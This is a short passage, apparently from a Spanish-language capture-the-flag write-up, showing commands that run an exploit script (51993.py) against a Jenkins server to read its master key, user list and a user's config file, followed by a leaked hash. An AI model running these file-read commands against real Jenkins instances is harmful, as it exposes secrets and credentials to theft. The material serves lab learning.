...
```shell
python3 51993.py -u http://<IP>:8080/ -p /var/jenkins_home/secrets/master.key
```
...
Este `hash` lo veremos mas adelante...

Mientras tanto vamos a lo importante haciendo lo siguiente...

```shell
python3 51993.py -u http://<IP>:8080/ -p /var/jenkins_home/users/users.xml
```
...
```shell
python3 51993.py -u http://<IP>:8080/ -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```
...
```
6c6e52c46533b78e2c5d4d8d08473994
```
